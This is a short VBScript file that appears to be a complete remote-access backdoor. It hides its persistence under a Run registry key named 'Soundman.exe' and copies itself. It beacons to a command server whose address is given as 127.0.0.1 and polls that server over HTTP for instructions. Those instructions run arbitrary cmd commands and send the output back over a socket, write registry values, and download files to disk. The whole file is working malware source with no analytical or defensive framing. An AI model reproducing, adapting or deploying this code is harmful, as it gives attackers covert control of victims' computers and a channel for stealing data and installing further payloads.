on error resume next
dim wsh,oxml,sock,return,cmd,N,sss,reg,vbcopy
Set wsh=CreateObject("WScript.Shell")
set oxml=createobject("msxml2.xmlhttp")
Set sock=CreateObject("MSWINSOCK.Winsock")
Set sGet=CreateObject("ADODB.Stream")
set fso=createobject("scripting.filesystemobject")
sock.Protocol=1
sock.RemoteHost="127.0.0.1"
sock.RemotePort=748
sock.SendData sock.localip & "=index.htm=" & ""
do
wsh.Regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Soundman.exe", wscript.Path & "\" & wscript.scriptname
fso.copyfile wscript.scriptfullname, wscript.Path & "\", True
oxml.open "post","http://127.0.0.1/index.htm",false
oxml.send
return=oxml.responsetext
cmd=split(return,"$")
for N=0 to UBound(cmd)
che(cmd(N))
next
wscript.sleep 10000
loop
function che(sss)
if mid(sss,len(sss)-2,1)="*" then
sss=left(sss,len(sss)-3)
end if
select case left(sss,1)
case "#"
wsh.run "cmd /c " & right(sss,len(sss)-1) & " >re.txt",0,true
set self=fso.opentextfile("re.txt",1)
wscript.sleep 4000
sock.RemotePort=5252
sock.SendData self.readall
case "@"
reg=split(right(sss,len(sss)-1),",")
wsh.Regwrite reg(0),reg(1),reg(2)
case "%"
down=split(right(sss,len(sss)-1),">")
oxml.open "post",LCase(down(0)),0
oxml.Send()
sGet.Mode=3
sGet.Type=1
sGet.Open()
sGet.Write(oxml.responseBody)
sGet.SaveToFile LCase(down(1)),2
end select
end function
